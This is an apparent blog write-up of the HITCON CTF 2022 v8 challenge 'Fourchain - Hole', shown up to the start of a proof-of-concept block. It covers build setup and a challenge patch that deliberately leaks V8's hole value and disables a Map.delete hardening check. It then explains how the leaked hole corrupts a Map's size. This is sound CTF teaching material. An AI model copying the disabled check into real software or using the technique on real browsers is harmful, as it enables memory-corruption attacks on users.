<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>HITCON CTF 2022 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:title" content="HITCON CTF 2022" />
<meta property="og:description" content="Writeup for HITCON CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/hitcon-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-27T21:06:10+07:00" />
<meta property="article:modified_time" content="2022-11-27T21:06:10+07:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>

<meta name="twitter:title" content="HITCON CTF 2022"/>
<meta name="twitter:description" content="Writeup for HITCON CTF 2022 by Chovid99"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="twitter:creator" content="@Chovid99"/>
<meta property="og:site_name" content="Chovid99's Blog">

<meta name="generator" content="Hugo 0.105.0">


  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />


  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-19HP521HQ9');
  </script>



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">‚Üê</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">HITCON CTF 2022</h1>

    <div class="tip">
        <time datetime="2022-11-27 21:06:10 &#43;0700 &#43;07">Nov 27, 2022</time>
        <span class="split">
          ¬∑
        </span>
        <span>
          4820 words
        </span>
        <span class="split">
          ¬∑
        </span>
        <span>
          23 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p><p class="markdown-image">
  <img src="https://i.imgur.com/P0KH6Qp.png" alt=""  />
</p>
During the weekends, I spent my time working on the HITCON CTF challenge called &ldquo;Fourchain - Hole&rdquo;. This is my first time doing a v8 browser pwn challenge, so I would like to apologize in advance if there is any mistake in my explanations and feel free to correct me if I&rsquo;m wrong.</p>
<h1 id="fourchain---hole">Fourchain - Hole <a href="#fourchain---hole" class="anchor">#</a></h1>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>There&#39;s a hole in the program ?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Well I&#39;m sure it&#39;s not that of a big deal, after all it&#39;s just a small hole that won&#39;t do any damage right ?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>... Right üò® ?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Author: bruce30262
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h2>
<p>This is a v8 browser challenge. We were given a zip consisting:</p>
<ul>
<li>The <code>d8</code> binary. This is a <code>v8</code> developer shell that can execute javascript code.</li>
<li><code>add_hole.patch</code>. This is the patch for the particular challenge.</li>
<li><code>README.txt</code>. This contains information about the args that the author specified during building the <code>d8</code> binary, the <code>commit hash</code> that we should use to build it (which is <code>63cb7fb817e60e5633fb622baf18c59da7a0a682</code>), and a hint that we should prepare our exploit in <code>Debian Linux 11.5</code>.</li>
</ul>
<h3 id="prerequisite">Prerequisite <a href="#prerequisite" class="anchor">#</a></h3>
<p>I highly recommend you read this <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" target="_blank" rel="noopener">great article</a> to gain some fundamentals on how <code>v8</code> works. But keep in mind that the article is already outdated because <code>v8</code> has changed some of their objects&rsquo; internal representation after the publication of that article.</p>
<h3 id="environment-setup">Environment Setup <a href="#environment-setup" class="anchor">#</a></h3>
<p>To start the challenge, we should prepare our environment first. Below is the summary of what I did to setup the environment (I followed the environment setup by Faraz&rsquo;s article):</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Install depot_tools and put it in the PATH
</span></span><span style="display:flex;"><span>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
</span></span><span style="display:flex;"><span>echo &#34;export PATH=&lt;your_depot_tools_path&gt;:$PATH&#34; &gt;&gt; ~/.zshrc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># Prepare the needed files to build
</span></span><span style="display:flex;"><span>fetch v8
</span></span><span style="display:flex;"><span>cd v8
</span></span><span style="display:flex;"><span>./build/install-build-deps.sh
</span></span><span style="display:flex;"><span>git checkout &lt;commit_hash&gt;
</span></span><span style="display:flex;"><span>gclient sync
</span></span><span style="display:flex;"><span>git apply add_hole.patch
</span></span><span style="display:flex;"><span>./tools/dev/v8gen.py x64.release
</span></span></code></pre></td></tr></table>
</div>
</div><p>After executing the above script, there will be a file called <code>args.gn</code> inside the <code>out.gn/x64.release</code> folder. Add these lines to the file before building it to make our debugging life easier</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>symbol_level = 2
</span></span><span style="display:flex;"><span>v8_enable_object_print = true
</span></span></code></pre></td></tr></table>
</div>
</div><p>And then we will build it with the below command</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Build it (It took me an hour to build it, so be patient)
</span></span><span style="display:flex;"><span>ninja -C ./out.gn/x64.release
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Additional Step:</strong> My <code>pwndbg</code> doesn&rsquo;t recognize the <code>job</code> command, which is very useful to debug the v8 shell later. After spending some quite time, turn out the solution is I need to add this LOC to my <code>.gdbinit</code> file: <code>source &lt;path_to_your_v8_folder&gt;/tools/gdbinit</code></p>
</blockquote>
<p>After we successfully build the <code>d8</code> binary, then we are ready to start the challenge.</p>
<h3 id="analyze-the-patch">Analyze the patch <a href="#analyze-the-patch" class="anchor">#</a></h3>
<p>Let&rsquo;s check the patch file.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#030;font-weight:bold">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">index 6e0cd408e7..aafdfb8544 100644
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span><span style="background-color:#fcc">--- a/src/builtins/builtins-array.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#fcc"></span><span style="background-color:#cfc">+++ b/src/builtins/builtins-array.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span><span style="color:#030;font-weight:bold">@@ -395,6 +395,12 @@ BUILTIN(ArrayPush) {
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span>   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="background-color:#cfc">+BUILTIN(ArrayHole){
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc">+    uint32_t len = args.length();
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc">+    if(len &gt; 1) return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc">+    return ReadOnlyRoots(isolate).the_hole_value();
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc">+}
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc">+
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span> namespace {
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
</span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">index 78b0229011..55aaaa03df 100644
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span><span style="background-color:#fcc">--- a/src/builtins/builtins-collections-gen.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#fcc"></span><span style="background-color:#cfc">+++ b/src/builtins/builtins-collections-gen.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span><span style="color:#030;font-weight:bold">@@ -1763,7 +1763,7 @@ TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) {
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span>                          &#34;Map.prototype.delete&#34;);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   // This check breaks a known exploitation technique. See crbug.com/1263462
</span></span><span style="display:flex;"><span><span style="background-color:#fcc">-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
</span></span></span><span style="display:flex;"><span><span style="background-color:#fcc"></span><span style="background-color:#cfc">+  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span> 
</span></span><span style="display:flex;"><span>   const TNode&lt;OrderedHashMap&gt; table =
</span></span><span style="display:flex;"><span>       LoadObjectField&lt;OrderedHashMap&gt;(CAST(receiver), JSMap::kTableOffset);
</span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">index 0e98586f7f..28a46f2856 100644
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span><span style="background-color:#fcc">--- a/src/builtins/builtins-definitions.h
</span></span></span><span style="display:flex;"><span><span style="background-color:#fcc"></span><span style="background-color:#cfc">+++ b/src/builtins/builtins-definitions.h
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span><span style="color:#030;font-weight:bold">@@ -413,6 +413,7 @@ namespace internal {
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span>   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \
</span></span><span style="display:flex;"><span>   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
</span></span><span style="display:flex;"><span>   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \
</span></span><span style="display:flex;"><span><span style="background-color:#cfc">+  CPP(ArrayHole)                                                               \
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span>                                                                                \
</span></span><span style="display:flex;"><span>   /* ArrayBuffer */                                                            \
</span></span><span style="display:flex;"><span>   /* ES #sec-arraybuffer-constructor */                                        \
</span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">index 79bdfbddcf..c42ad4c789 100644
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span><span style="background-color:#fcc">--- a/src/compiler/typer.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#fcc"></span><span style="background-color:#cfc">+++ b/src/compiler/typer.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span><span style="color:#030;font-weight:bold">@@ -1722,6 +1722,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span>       return Type::Receiver();
</span></span><span style="display:flex;"><span>     case Builtin::kArrayUnshift:
</span></span><span style="display:flex;"><span>       return t-&gt;cache_-&gt;kPositiveSafeInteger;
</span></span><span style="display:flex;"><span><span style="background-color:#cfc">+    case Builtin::kArrayHole:
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc">+      return Type::Oddball();
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span> 
</span></span><span style="display:flex;"><span>     // ArrayBuffer functions.
</span></span><span style="display:flex;"><span>     case Builtin::kArrayBufferIsView:
</span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold">index 9040e95202..a77333287a 100644
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span><span style="background-color:#fcc">--- a/src/init/bootstrapper.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#fcc"></span><span style="background-color:#cfc">+++ b/src/init/bootstrapper.cc
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span><span style="color:#030;font-weight:bold">@@ -1800,6 +1800,7 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
</span></span></span><span style="display:flex;"><span><span style="color:#030;font-weight:bold"></span>                           Builtin::kArrayPrototypeFindIndex, 1, false);
</span></span><span style="display:flex;"><span>     SimpleInstallFunction(isolate_, proto, &#34;lastIndexOf&#34;,
</span></span><span style="display:flex;"><span>                           Builtin::kArrayPrototypeLastIndexOf, 1, false);
</span></span><span style="display:flex;"><span><span style="background-color:#cfc">+    SimpleInstallFunction(isolate_, proto, &#34;hole&#34;, Builtin::kArrayHole, 0, false);
</span></span></span><span style="display:flex;"><span><span style="background-color:#cfc"></span>     SimpleInstallFunction(isolate_, proto, &#34;pop&#34;, Builtin::kArrayPrototypePop,
</span></span><span style="display:flex;"><span>                           0, false);
</span></span><span style="display:flex;"><span>     SimpleInstallFunction(isolate_, proto, &#34;push&#34;, Builtin::kArrayPrototypePush,
</span></span></code></pre></td></tr></table>
</div>
</div><p>After reading the patch, some interesting information:</p>
<ul>
<li>It introduces a new function called <code>hole</code> in an array. If we read the <code>BUILTIN(ArrayHole)</code> definition, the <code>hole</code> function:
<ul>
<li>Doesn&rsquo;t need any args</li>
<li>Will return a value from <code>the_hole_value()</code></li>
</ul>
</li>
<li>It disables a <code>CSA_CHECK</code>, which job is to make sure that the assigned key isn&rsquo;t <code>hole</code>, and also it has a link to <a href="crbug.com/1263462">crbug.com/1263462</a> which contains the exploitation related to the <code>hole</code> value. We will visit this site soon to gain some information on what is <code>hole</code> value.</li>
</ul>
<h3 id="searching-for-the-hole-value">Searching for the <code>hole</code> value <a href="#searching-for-the-hole-value" class="anchor">#</a></h3>
<p>I don&rsquo;t have any idea what is <code>hole</code> and why it is dangerous. So, I decided to read through the article that was mentioned in the patch first.</p>
<p>After reading through the <code>crbug</code> article, turns out <code>hole</code> is a constant defined in the <code>v8</code> source code. Due to special handling of the <code>hole</code> value in the javascript <code>Map</code> datatype, if we got a leak of the <code>hole</code> value and set it as one of the <code>Map</code> object keys, we can corrupt the <code>Map</code> length to <code>-1</code>, because somehow, we can call <code>Map.delete(hole)</code> twice, which leads to decrement the <code>Map</code> size by two for one key only. Below is the simple POC stated in the article:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
